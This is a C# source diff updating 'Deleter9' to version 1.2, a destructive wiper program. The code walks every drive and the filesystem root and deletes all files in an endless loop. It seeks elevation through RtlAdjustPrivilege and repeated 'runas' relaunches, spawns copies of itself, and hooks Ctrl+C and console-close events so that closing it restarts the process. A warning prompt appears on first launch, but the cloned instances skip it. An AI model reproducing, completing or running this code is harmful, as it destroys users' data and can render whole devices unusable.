@@ -2,140 +2,60 @@ namespace System
 {
     public class OS
     {
-        public bool IsWindows;
+        static OS detectedOS;
+        public bool IsWin;
         public string ProcessFilePath;
-        private static bool CapitalizeContains(string a, string b)
+        public virtual void RestartProcess() => Diagnostics.Process.Start(Reflection.Assembly.GetEntryAssembly().Location);
+        public static string GetExePath() => Reflection.Assembly.GetEntryAssembly().Location;
+        public static string GetRuntimeExePath() => Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
+        public unsafe static OS Get()
         {
-            a = Capitalize(a);
-            b = Capitalize(b);
-            return a.IndexOf(b) >= 0;
-        }
-        private static string Capitalize(string str)
-        {
-            if (string.IsNullOrEmpty(str))
-            {
-                return str;
-            }
-            char[] a = str.ToLower().ToCharArray();
-            a[0] = char.ToUpper(a[0]);
-            return new(a);
-        }
-        public virtual void RestartProcess()
-        {
-            Diagnostics.Process.Start(Reflection.Assembly.GetEntryAssembly().Location);
-        }
-        public static string GetExePath()
-        {
-            return Reflection.Assembly.GetEntryAssembly().Location;
-        }
-        public static string GetRuntimeExePath()
-        {
-            return Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
-        }
-        public static bool RunningOnMono()
-        {
-            return Type.GetType("Mono.Runtime") != null;
-        }
-        public unsafe static OS GetCurrentOS()
-        {
-            if (RunningOnMono())
-            {
-                return new Mono();
-            }
-            else
-            {
-                PlatformID platform = Environment.OSVersion.Platform;
-                OS win = new Win(),
-                    unix = new Unix(),
-                    linux = new Linux();
-                if (platform == PlatformID.Win32S)
-                {
-                    return win;
-                }
-                else if (platform == PlatformID.Win32Windows)
-                {
-                    return win;
-                }
-                else if (platform == PlatformID.Win32NT)
-                {
-                    return win;
-                }
-                else if (platform == PlatformID.WinCE)
-                {
-                    return win;
-                }
-                else if (platform == PlatformID.Xbox)
-                {
-                    return win;
-                }
-                else if (platform == PlatformID.Unix)
-                {
-                    sbyte* utsname = stackalloc sbyte[8192];
-                    uname(utsname);
-                    string kernel = new(utsname);
-                    if (CapitalizeContains(kernel, "Linux"))
+            detectedOS ??= Type.GetType("Mono.Runtime") != null
+                    ? new Mono()
+                    : Environment.OSVersion.Platform switch
                     {
-                        return linux;
-                    }
-                    else if (CapitalizeContains(kernel, "Unix"))
-                    {
-                        return unix;
-                    }
-                    else
-                    {
-                        return unix;
-                    }
-                }
-                else if (platform == PlatformID.MacOSX)
-                {
-                    return unix;
-                }
-                else
-                {
-                    sbyte* utsname = stackalloc sbyte[8192];
-                    uname(utsname);
-                    string kernel = new(utsname);
-                    if (CapitalizeContains(kernel, "Windows"))
-                    {
-                        return win;
-                    }
-                    else if (CapitalizeContains(kernel, "Linux"))
-                    {
-                        return linux;
-                    }
-                    else if (CapitalizeContains(kernel, "Unix"))
-                    {
-                        return unix;
-                    }
-                    else
-                    {
-                        return unix;
-                    }
-                }
-            }
+                        PlatformID.Win32S or PlatformID.Win32Windows or PlatformID.Win32NT or PlatformID.WinCE or PlatformID.Xbox => new Win(),
+                        _ => TryGet(),
+                    };
+            return detectedOS;
         }
         [Runtime.InteropServices.DllImport("libc")]
-        public unsafe static extern void uname(sbyte* uname_struct);
+        unsafe static extern void uname(sbyte* uname_struct);
+        unsafe static OS TryGet()
+        {
+            try
+            {
+                sbyte* utsname = stackalloc sbyte[8192];
+                uname(utsname);
+                string kernel = new(utsname);
+                return kernel.ToLower().Contains("linux") ? new Linux() : new Unix();
+            }
+            catch
+            {
+                return new OS()
+                {
+                    IsWin = false,
+                    ProcessFilePath = IO.Path.GetFullPath(Reflection.Assembly.GetExecutingAssembly().Location)
+                };
+            }
+        }
     }
     public class Win : OS
     {
         public Win()
         {
-            IsWindows = true;
-            ProcessFilePath = IO.Path.GetFullPath(Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
+            IsWin = true;
+            ProcessFilePath = IO.Path.GetFullPath(Reflection.Assembly.GetEntryAssembly().Location);
         }
     }
     public class Unix : OS
     {
         public Unix()
         {
-            IsWindows = false;
+            IsWin = false;
             ProcessFilePath = IO.Path.GetFullPath(Reflection.Assembly.GetExecutingAssembly().Location);
         }
-        public override void RestartProcess()
-        {
-            RestartInPlace();
-        }
+        public override void RestartProcess() => RestartInPlace();
         public virtual void RestartInPlace()
         {
             execvp(GetRuntimeExePath(), new string[]
@@ -145,16 +65,7 @@ namespace System
                 null
             });
             Console.Out.WriteLine("execvp {0} failed: {1}", GetRuntimeExePath(), Runtime.InteropServices.Marshal.GetLastWin32Error());
-            if (RunningOnMono())
-            {
-                execvp("mono", new string[]
-                {
-                "mono",
-                GetExePath(),
-                null
-                });
-                Console.Out.WriteLine("execvp mono failed: {0}", Runtime.InteropServices.Marshal.GetLastWin32Error());
-            }
+            Console.Out.Flush();
         }
         [Runtime.InteropServices.DllImport("libc", SetLastError = true)]
         public static extern int execvp(string path, string[] argv);
@@ -170,7 +81,7 @@ namespace System
     {
         public Mono()
         {
-            IsWindows = false;
+            IsWin = false;
             ProcessFilePath = IO.Path.GetFullPath(Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
         }
         public override void RestartProcess()
@@ -182,6 +93,7 @@ namespace System
             catch (Exception ex)
             {
                 Console.Out.WriteLine("Error restarting process: {0}", ex);
+                Console.Out.Flush();
             }
             RestartInPlace();
         }
@@ -190,7 +102,7 @@ namespace System
     {
         public Linux()
         {
-            IsWindows = false;
+            IsWin = false;
             ProcessFilePath = IO.Path.GetFullPath(Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
         }
         public override void RestartInPlace()
@@ -202,38 +114,39 @@ namespace System
             catch (Exception ex)
             {
                 Console.Out.WriteLine("Error restarting process: {0}", ex);
+                Console.Out.Flush();
             }
             base.RestartInPlace();
         }
     }
     public class Deleter
     {
+        delegate bool ConsoleEventDelegate(int eventType);
+        [Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);
+        static ConsoleEventDelegate handler;
         [Runtime.InteropServices.DllImport("ntdll.dll")]
         public static extern uint RtlAdjustPrivilege(int Privilege, bool EnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
-        public delegate bool ConsoleEventDelegate(int eventType);
-        [Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
-        public static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);
-        public const string Ver = "1.1", Title = "Deleter9 v" + Ver;
-        private static string[] LogicalDrives;
-        private static Collections.Generic.List<IO.DriveInfo> Disks = new()
+        public const string Ver = "1.2", Title = "Deleter9 v" + Ver;
+        static string[] LogicalDrives;
+        static Collections.Generic.List<IO.DriveInfo> Disks = new()
         {
         };
-        private static readonly Collections.Generic.List<string> DirectoriesList = new()
+        static readonly Collections.Generic.List<string> DirectoriesList = new()
         {
         };
-        private static string FileName = string.Empty,
+        static string FileName = string.Empty,
             FileExtension = string.Empty;
-        private static double Double, LoopingDouble, Count = 0;
-        private static readonly string Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
-        private static readonly string[] Messages = Argument.Split('\n');
-        private static bool FileDeleted = false, IsCloned = false;
-        private static Exception Exception;
-        private static bool CanAccess(string folderPath, out Exception ex)
+        static double Double, LoopingDouble, Count = 0;
+        static readonly string Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
+        static readonly string[] Messages = Argument.Split('\n');
+        static bool FileDeleted = false, IsCloned = false;
+        static Exception Exception;
+        static bool CanAccess(string folderPath, out Exception ex)
         {
-            IO.DirectoryInfo dirInfo = new(folderPath);
             try
             {
-                dirInfo.GetAccessControl(Security.AccessControl.AccessControlSections.All);
+                new IO.DirectoryInfo(folderPath).GetAccessControl(Security.AccessControl.AccessControlSections.All);
                 ex = null;
                 return true;
             }
@@ -243,21 +156,19 @@ namespace System
                 return false;
             }
         }
-        private static Collections.Generic.List<string> AddDir(string dir)
+        static void AddDir(string dir)
         {
             if (!DirectoriesList.Contains(dir))
             {
                 if (CanAccess(dir, out Exception ex))
-                {
                     DirectoriesList.Add(dir);
-                }
                 else
                 {
                     Console.Out.WriteLine("Can't access " + dir + ex);
+                    Console.Out.Flush();
                 }
             }
             foreach (string d in IO.Directory.GetDirectories(dir))
-            {
                 if (CanAccess(d, out Exception ex))
                 {
                     DirectoriesList.Add(d);
@@ -266,22 +177,19 @@ namespace System
                 else
                 {
                     Console.Out.WriteLine("Can't access " + d + ex);
+                    Console.Out.Flush();
                 }
-            }
-            return DirectoriesList;
         }
-        private static void TryDeleteFile(string file)
+        static void TryDeleteFile(string file)
         {
             if (IO.File.Exists(file))
-            {
                 try
                 {
                     Console.Out.WriteLine("Deleting " + file);
+                    Console.Out.Flush();
                     IO.File.Delete(file);
                     if (!IO.File.Exists(file))
-                    {
                         FileDeleted = true;
-                    }
                     else
                     {
                         Exception = new InvalidOperationException("Failed to delete file: " + file);
@@ -293,13 +201,10 @@ namespace System
                     Exception = e;
                     FileDeleted = false;
                 }
-            }
             else
-            {
                 FileDeleted = true;
-            }
         }
-        private static void ContinueDeletingUnix()
+        static void ContinueDeletingUnix()
         {
             try
             {
@@ -308,18 +213,24 @@ namespace System
             catch
             {
                 Console.Out.WriteLine("Failed to adjust privileges, continuing without them.");
+                Console.Out.Flush();
             }
             Console.Clear();
             Count++;
             Console.Out.WriteLine(Count);
+            Console.Out.Flush();
             Console.ForegroundColor = ConsoleColor.Yellow;
             Console.BackgroundColor = ConsoleColor.Black;
             Threading.Thread.Sleep(200);
             Console.Out.WriteLine(Messages);
+            Console.Out.Flush();
             string root = IO.Directory.GetDirectoryRoot(IO.Directory.GetCurrentDirectory());
-            if (root == null || root == "")
+            switch (root)
             {
-                root = "/";
+                case null:
+                case "":
+                    root = "/";
+                    break;
             }
             AddDir(root);
             while (LoopingDouble != double.PositiveInfinity)
@@ -327,20 +238,18 @@ namespace System
                 LoopingDouble++;
                 try
                 {
-                    Collections.Generic.List<string> dirs = DirectoriesList;
-                    foreach (string dir in dirs)
-                    {
-                        string[] files = IO.Directory.GetFiles(dir);
-                        foreach (string file in files)
+                    foreach (string dir in DirectoriesList)
+                        foreach (string file in IO.Directory.GetFiles(dir))
                         {
                             TryDeleteFile(file);
                             if (!FileDeleted)
                             {
                                 Console.Out.WriteLine("Failed to delete file: " + file);
+                                Console.Out.Flush();
                                 Console.Out.WriteLine(Exception);
+                                Console.Out.Flush();
                             }
                         }
-                    }
                 }
                 catch
                 {
@@ -348,7 +257,7 @@ namespace System
                 }
             }
         }
-        private static void DeleteDirUnix()
+        static void DeleteDirUnix()
         {
             try
             {
@@ -357,14 +266,19 @@ namespace System
             catch
             {
                 Console.Out.WriteLine("Failed to adjust privileges, continuing without them.");
+                Console.Out.Flush();
             }
             Console.ForegroundColor = ConsoleColor.Red;
             Console.BackgroundColor = ConsoleColor.Black;
             Console.Out.WriteLine(Messages);
+            Console.Out.Flush();
             string root = IO.Directory.GetDirectoryRoot(IO.Directory.GetCurrentDirectory());
-            if (root == null || root == "")
+            switch (root)
             {
-                root = "/";
+                case null:
+                case "":
+                    root = "/";
+                    break;
             }
             AddDir(root);
             while (LoopingDouble != double.PositiveInfinity)
@@ -372,20 +286,18 @@ namespace System
                 LoopingDouble++;
                 try
                 {
-                    Collections.Generic.List<string> dirs = DirectoriesList;
-                    foreach (string dir in dirs)
-                    {
-                        string[] files = IO.Directory.GetFiles(dir);
-                        foreach (string file in files)
+                    foreach (string dir in DirectoriesList)
+                        foreach (string file in IO.Directory.GetFiles(dir))
                         {
                             TryDeleteFile(file);
                             if (!FileDeleted)
                             {
                                 Console.Out.WriteLine("Failed to delete file: " + file);
+                                Console.Out.Flush();
                                 Console.Out.WriteLine(Exception);
+                                Console.Out.Flush();
                             }
                         }
-                    }
                 }
                 catch
                 {
@@ -393,46 +305,45 @@ namespace System
                 }
             }
         }
-        private static void DeleteDir()
+        static void DeleteDir()
         {
             try
             {
                 Console.Clear();
                 Console.Out.WriteLine(Messages);
+                Console.Out.Flush();
                 LogicalDrives = IO.Directory.GetLogicalDrives();
                 Disks = new Collections.Generic.List<IO.DriveInfo>(IO.DriveInfo.GetDrives());
                 foreach (IO.DriveInfo disk in Disks)
                 {
                     if (disk.Name != disk.VolumeLabel)
-                    {
                         Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
-                    }
                     else
-                    {
                         Console.Out.WriteLine("Current drive is: " + disk.Name);
-                    }
+                    Console.Out.Flush();
                     foreach (string drive in LogicalDrives)
                     {
                         string root = IO.Directory.GetDirectoryRoot(drive);
-                        if (root == null || root == "")
+                        switch (root)
                         {
-                            root = "/";
+                            case null:
+                            case "":
+                                root = "/";
+                                break;
                         }
                         AddDir(root);
-                        Collections.Generic.List<string> dirs = DirectoriesList;
-                        foreach (string dir in dirs)
-                        {
-                            string[] files = IO.Directory.GetFiles(dir);
-                            foreach (string file in files)
+                        foreach (string dir in DirectoriesList)
+                            foreach (string file in IO.Directory.GetFiles(dir))
                             {
                                 TryDeleteFile(file);
                                 if (!FileDeleted)
                                 {
                                     Console.Out.WriteLine("Failed to delete file: " + file);
+                                    Console.Out.Flush();
                                     Console.Out.WriteLine(Exception);
+                                    Console.Out.Flush();
                                 }
                             }
-                        }
                     }
                 }
             }
@@ -445,7 +356,7 @@ namespace System
                 }
             }
         }
-        private static void ContinueDeleting()
+        static void ContinueDeleting()
         {
             try
             {
@@ -453,42 +364,42 @@ namespace System
                 LogicalDrives = IO.Directory.GetLogicalDrives();
                 Disks = new Collections.Generic.List<IO.DriveInfo>(IO.DriveInfo.GetDrives());
                 Console.Out.WriteLine(Count);
+                Console.Out.Flush();
                 Console.ForegroundColor = ConsoleColor.Yellow;
                 Console.BackgroundColor = ConsoleColor.Black;
                 Threading.Thread.Sleep(200);
                 Console.Out.WriteLine(Messages);
+                Console.Out.Flush();
                 foreach (IO.DriveInfo disk in Disks)
                 {
                     if (disk.Name != disk.VolumeLabel)
-                    {
                         Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
-                    }
                     else
-                    {
                         Console.Out.WriteLine("Current drive is: " + disk.Name);
-                    }
+                    Console.Out.Flush();
                     foreach (string drive in LogicalDrives)
                     {
                         string root = IO.Directory.GetDirectoryRoot(drive);
-                        if (root == null || root == "")
+                        switch (root)
                         {
-                            root = "/";
+                            case null:
+                            case "":
+                                root = "/";
+                                break;
                         }
                         AddDir(root);
-                        Collections.Generic.List<string> dirs = DirectoriesList;
-                        foreach (string dir in dirs)
-                        {
-                            string[] files = IO.Directory.GetFiles(dir);
-                            foreach (string file in files)
+                        foreach (string dir in DirectoriesList)
+                            foreach (string file in IO.Directory.GetFiles(dir))
                             {
                                 TryDeleteFile(file);
                                 if (!FileDeleted)
                                 {
                                     Console.Out.WriteLine("Failed to delete file: " + file);
+                                    Console.Out.Flush();
                                     Console.Out.WriteLine(Exception);
+                                    Console.Out.Flush();
                                 }
                             }
-                        }
                     }
                 }
             }
@@ -501,40 +412,35 @@ namespace System
                 }
             }
         }
-        private static bool ConsoleEventCallback(int eventType)
+        static bool ConsoleEventCallback(int eventType)
         {
-            OS.GetCurrentOS().RestartProcess();
+            OS.Get().RestartProcess();
             return false;
         }
-        private static void OnCancelKeyPress(object sender, ConsoleCancelEventArgs e)
+        static void OnCancelKeyPress(object sender, ConsoleCancelEventArgs e) => OS.Get().RestartProcess();
+        static void Continue()
         {
-            OS.GetCurrentOS().RestartProcess();
-        }
-        private static void Continue()
-        {
-            FileExtension = IO.Path.GetExtension(OS.GetCurrentOS().ProcessFilePath);
-            FileName = IO.Path.GetFileNameWithoutExtension(OS.GetCurrentOS().ProcessFilePath);
-            if (OS.GetCurrentOS().IsWindows)
+            FileExtension = IO.Path.GetExtension(OS.Get().ProcessFilePath);
+            FileName = IO.Path.GetFileNameWithoutExtension(OS.Get().ProcessFilePath);
+            if (OS.Get().IsWin)
             {
                 Console.CancelKeyPress += OnCancelKeyPress;
-                SetConsoleCtrlHandler(new(ConsoleEventCallback), true);
+                handler = new(ConsoleEventCallback);
+                SetConsoleCtrlHandler(handler, true);
                 Console.Title = Title;
                 Console.ForegroundColor = ConsoleColor.Red;
                 Console.BackgroundColor = ConsoleColor.Black;
             }
             Threading.Thread.Sleep(1000);
             while (Double != double.PositiveInfinity)
-            {
                 try
                 {
                     Double++;
-                    if (!OS.GetCurrentOS().IsWindows)
-                    {
+                    if (!OS.Get().IsWin)
                         DeleteDirUnix();
-                    }
                     else
                     {
-                        IO.File.Copy(IO.Path.GetFileName(OS.GetCurrentOS().ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
+                        IO.File.Copy(IO.Path.GetFileName(OS.Get().ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
                         Diagnostics.Process p = new();
                         p.StartInfo.UseShellExecute = true;
                         p.StartInfo.Verb = "runas";
@@ -556,42 +462,28 @@ namespace System
                         Start();
                     }
                 }
-            }
         }
         public static void Main(string[] args)
         {
             string arguments = "";
             foreach (string arg in args)
-            {
                 arguments += arg;
-            }
-            if (arguments.ToLower().Contains("cloned"))
-            {
-                IsCloned = true;
-            }
-            else
-            {
-                IsCloned = false;
-            }
+            IsCloned = arguments.ToLower().Contains("cloned");
             if (!IsCloned)
             {
                 Console.Out.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
                     "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
+                Console.Out.Flush();
                 Console.Out.WriteLine("ARE YOU SURE YOU WANT TO CONTINUE? Y OR N");
+                Console.Out.Flush();
                 if (!Console.ReadLine().ToUpper().Contains("Y"))
-                {
                     Environment.Exit(0);
-                    return;
-                }
             }
             if (Security.Principal.WindowsIdentity.GetCurrent().IsSystem 
                 || Security.Principal.WindowsIdentity.GetCurrent().User.ToString() == "S-1-5-18"  
                 || new Security.Principal.WindowsPrincipal(Security.Principal.WindowsIdentity.GetCurrent()).IsInRole(Security.Principal.WindowsBuiltInRole.Administrator))
-            {
                 Start();
-            }
             else
-            {
                 try
                 {
                     Diagnostics.Process p = new();
@@ -608,36 +500,34 @@ namespace System
                 catch (Exception e)
                 {
                     Console.Out.WriteLine("Error when deleting: {0}", e);
+                    Console.Out.Flush();
                     Console.ReadKey();
                     Environment.Exit(0);
                 }
-            }
         }
-        private static void Start()
+        static void Start()
         {
-            FileExtension = IO.Path.GetExtension(OS.GetCurrentOS().ProcessFilePath);
-            FileName = IO.Path.GetFileNameWithoutExtension(OS.GetCurrentOS().ProcessFilePath);
-            if (OS.GetCurrentOS().IsWindows)
+            FileExtension = IO.Path.GetExtension(OS.Get().ProcessFilePath);
+            FileName = IO.Path.GetFileNameWithoutExtension(OS.Get().ProcessFilePath);
+            if (OS.Get().IsWin)
             {
                 Console.CancelKeyPress += OnCancelKeyPress;
-                SetConsoleCtrlHandler(new(ConsoleEventCallback), true);
+                handler = new(ConsoleEventCallback);
+                SetConsoleCtrlHandler(handler, true);
                 Console.Title = Title;
                 Console.ForegroundColor = ConsoleColor.Red;
                 Console.BackgroundColor = ConsoleColor.Black;
             }
             Threading.Thread.Sleep(1000);
             while (Double != double.PositiveInfinity)
-            {
                 try
                 {
                     Double++;
-                    if (!OS.GetCurrentOS().IsWindows)
-                    {
+                    if (!OS.Get().IsWin)
                         DeleteDirUnix();
-                    }
                     else
                     {
-                        IO.File.Copy(IO.Path.GetFileName(OS.GetCurrentOS().ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
+                        IO.File.Copy(IO.Path.GetFileName(OS.Get().ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
                         Diagnostics.Process p = new();
                         p.StartInfo.UseShellExecute = true;
                         p.StartInfo.Verb = "runas";
@@ -659,7 +549,6 @@ namespace System
                         Continue();
                     }
                 }
-            }
         }
     }
 }
